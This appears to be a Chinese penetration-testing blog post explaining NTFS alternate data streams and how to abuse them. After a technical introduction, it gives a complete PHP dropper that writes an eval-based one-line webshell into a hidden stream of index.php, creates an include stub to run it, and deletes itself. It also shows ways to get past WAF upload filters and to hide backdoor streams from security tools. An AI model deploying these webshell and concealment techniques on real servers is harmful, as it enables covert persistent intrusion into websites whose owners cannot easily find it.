---
layout: post
author: Vulkey_Chen
title: "文件寄生——NTFS文件流实际应用"
date: 2017-03-29
music-id: 
permalink: /archives/2017-03-29/1
description: "利用文件流可以给渗透测试带来很大的便利"
---

# What is NTFS文件流

NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是**未命名的文件流**，同时可创建其他命名的文件流，windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。

## NTFS文件流生成步骤

我们在任意一个NTFS分区下打开CMD命令提示符，输入`echo mstlab>>mst.txt:test.txt`，则在当前目录下会生成一个名为mst.txt的文件，但文件的大小为0字节，打开后也无任何内容。 

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/0.jpg)

只有输入命令：notepad mst.txt:test.txt 才能看见写入的mstlab

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/1.jpg)

在上边的命令中，mst.txt可以不存在，也可以是某个已存的文件，文件格式无所谓，无论是.txt还是.jpg\|.exe\|.asp都行b.txt也可以任意指定文件名以及后缀名。（可以将任意文本信息隐藏于任意文件中，只要不泄露冒号后的虚拟文件名(即test.txt)，别人是根本不会查看到隐藏信息的）

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/2.jpg)

包含隐藏信息的文件仍然可以继续隐藏其它的内容，对比上例，我们仍然可以使用命令`echo 
mstlab1>>mst.txt:test1.txt`给mst.txt建立新的隐藏信息的流文件，使用命令`notepad 
mst.txt:test1.txt`打开后会发现mstlab1这段信息，而mstlab仍然存在于mst.txt:test.txt中丝毫不受影响

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/3.jpg)

所以这里的宿主mst.txt成功的被test.txt和test1.txt所寄生，而在这里的微妙关系显而易见，宿主消失寄生消失。

## NTFS特性和原理分析

### 特性1

实验工具下载：[https://github.com/wangyongxina/filestreams/blob/master/Release/Release.7z](http://link.zhihu.com/?target=https%3A//github.com/wangyongxina/filestreams/blob/master/Release/Release.7z)

**工具使用说明：** 

> create      创建文件流 
>
> enum       列举文件流 
>
> delete      删除文件流 
>
> write       写入内容到文件流 
>
> append     增加文件到文件流 
>
> launch      执行文件流的内容 
>
> dump       读取文件流的内容 

我们让上一步骤归零，重新来看看mst.txt： 

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/4.jpg)

而这里的default文件流就验证了最开头的一句话，默认使用的是为命名的文件流。

实验开始，首先我们使用FileStreams.exe创建一个文件流vkey：

```shell
FileStreams.exe create mst.txt vkey
```

然后写入内容到文件流vkey： 

```shell
FileStreams.exe write mst.txt vkey content
```

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/5.jpg)

再来查看文件流vkey的内容： 

```shell
FileStreams.exe dump mst.txt vkey 14 
```

这里的14从何而来，相信聪明的你们能明白。（文件流vkey大小 14）

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/6.png)

最开始也说了，文件流是可以用来启动程序的，我们来试试： 

- 加入文件到文件流vkey： 

  `FileStreams.exe append mst.txt vkey C:\Users\gh0stkey\Desktop\test\FileStreams.exe`

  ![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/7.jpg)

- 查看文件流vkey的内容，这里就看前100个字节的内容：

  `FileStreams.exe dump mst.txt vkey 100`

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/8.png)

- 执行文件流vkey：

  顺利的执行了 `C:\Users\gh0stkey\Desktop\test\FileStreams.exe` 这个文件。 

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/9.png)

### 特性2

自动创建空文件： 

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/10.png)

自动创建宿主，然后寄生。  

在没有原文件的情况下创建文件流，会自动创建一个空文件。

**原理分析：** 

好，现在我们以及初步了解了文件流的特性。再来看看NTFS文件流实现原理： 

如文件大小，文件创建时间，文件修改时间，文件名，文件内容等被组织成属性来存放，NTFS定义了一序列的文件属性： 

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/11.png)

详细说明可以搜索NTFS3G，这些属性统一组织在NTFS的MFT（Master File 
Table）上，每个MFT大小1024个字节，MFT的\$DATA属性即是前面提到的文件流，通常来说包含多个不同名字的\$DATA属性即说明该文件存在多个文件流，下图是winhex打开1.txt定位到1.txt的MFT，我们实际看一下NTFS是如何组织的：

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/12.png)

## Pentesting With NTFS

### Webshell后门隐藏

写一个PHP的Webshell，首先网站的默认首页是index.php，所以使用了第一段代码：

```php
exec('echo "<?php @eval($_POST[key]);?>">>index.php:key.php');
```

直接写一个一句话内容到key.php这个文件流中。 
其次，文件流是不可能直接执行的，但是PHP可以使用包含函数：

```php
$key = <<<key 
echo "<?php include 'index.php:key.php';?>">>a.php 
key; 
exec($key); 
```

最后，为了不被发现要删除本身文件： 

```php
$url = $_SERVER['PHP_SELF']; 
$filename= substr($url,strrpos($url,'/')+1); 
@unlink($filename); 
```

最终代码：

```php
<?php
exec('echo "<?php @eval($_POST[key]);?>">>index.php:key.php');

$key = <<<key
echo "<?php include 'index.php:key.php';?>">>a.php
key;

exec($key);
$url = $_SERVER['PHP_SELF'];
$filename= substr($url,strrpos($url,'/')+1);
@unlink($filename);
?> 
```

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/13.jpg)

### 软件后门隐藏

使用特性1写一段代码后台自动运行这个文件流即可。 

### ByPass WAF

#### 文件上传

在文件上传的时候可以直接ByPass Waf规则，但是较为鸡肋需要搭配文件包含漏洞：

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/14.png)

#### Bypas 查杀

利用下面的默认流替换特性上传文件名为1.php:的文件，绕过后缀名限制即可。

当然你也可以做一个持续性webshell后门，然后使用include包含起来即可利用：

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/15.jpg)

### 默认流替换

默认流也就是宿主自身的，这里完全可以吞噬宿主，成为宿主。 

这个方法算是打破常规的认识了，很有意思。 

如图，我们直接执行`echo xxxx>>1.txt:`，可替换默认流:

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/16.jpg)

当然如果宿主不存在，将会创建宿主并且吞噬宿主，从而成为宿主。 

## NTFS局限性

这个NTFS数据流文件，也叫Alternate data  streams，简称ADS，是NTFS文件系统的一个特性之一，允许单独的数据流文件存在，同时也允许一个文件附着多个数据流，即除了主文件流之外还允许许多非主文件流寄生在主文件流之中，它使用资源派生的方式来维持与文件相关信息，并且这些寄生的数据流文件我们使用资源管理器是看不到的。

**2、为什么NTFS有数据流这个特性？**
原意是为了和Macintosh的HFS文件系统兼容而设计的，使用这种技术可以在一个文件资源里写入相关数据(并不是写入文件中)，而且写进去的数据可以使用很简单的方法把它提取出来作为一个独立文件读取，甚至执行。

**3、为什么资源管理器里面看不到文件所带的数据流文件呢？**
我们之所以无法在系统中看到NTFS数据流文件，是因为Windows中的很多工具对数据流文件的支持并不是很好，就像“资源管理器”，我们无法在“资源管理器”中看到有关数据流文件的变化。

不过这个原因很奇怪，同样是MS自己做的东西，"资源管理器都支持不好，还有啥工具能支持好呢？"   ，后来再想，也可能是这样一个原因：在当时写有关NTFS文件系统的数据流存储的时候很多WINDOWS工具没有相应的更新，同时呢NTFS流的显示与普通的文件不一样，需要使用其他的枚举方式来完成，再有NTFS对广大普通用户桌面用户来说没有必要去看到，更多的是被专业软件所使用，即使显示出来也没意义。

**OK，进入正题，那么我们今天来分析下NTFS文件流这个寄生虫的一些“缺点”**

1. 宿主需求，寄生虫需要宿主才可以繁衍。

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/17.jpg)

2. 共存状态。宿主死亡，寄生虫随之死亡。

### 局限点突破

#### 宿主需求

##### 测试1

一开始感觉无后缀名的会被windows自动隐藏起来，所以输入命令：`echo mstsec>>hi:ourlife.txt`

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/18.png)

然而是自己想多了。。。

##### 测试2

后来想了下，Windows资源管理器是可以隐藏文件的，而默认的服务器隐藏文件是看不见的，也就是说，宿主是可以隐藏的

> 命令：attrib +s +h hi
> 解释：attrib命令的意思，+s是为文件添加系统文件属性，+h是添加隐藏属性的意思。

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/19.jpg)

此方法可行，在一定的程度上保护了咱们的寄生虫。

但是我这个人吧，有一个毛病，强迫症，就感觉不舒服，于是就开始了更隐蔽的测试。

##### 测试3

我重新理了一下思路，既然是无宿主，那么就顺着这个路线开始慢慢的推进，那就试试无宿主自体繁衍：

正常宿主寄生命令：`echo gh0stkey>>www:hiourlife.txt`
www是宿主文件，无宿主就删掉www呗~
修改后的命令：`echo gh0stkey>>:hiourlife.txt`

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/20.jpg)

结果：无宿主寄生，完全是可以的。**测试3成功**

其实这个命令就是将寄生虫寄生到文件夹上，转换一下命令就成了：

```shell
echo gh0stkey>>/:hiourlife.txt
```

那么运用在实际测试中，只要目录不变动，就不会被（安全狗之类的WAF）发现

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/21.jpg)

![ntfs](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-03-29/22.png)

# END

原文件=宿主，文件流=寄生虫。各位朋友根据根据这篇文章的基础继续深入研究，把文件流应用于各种操作之中，造出"猥琐"流。
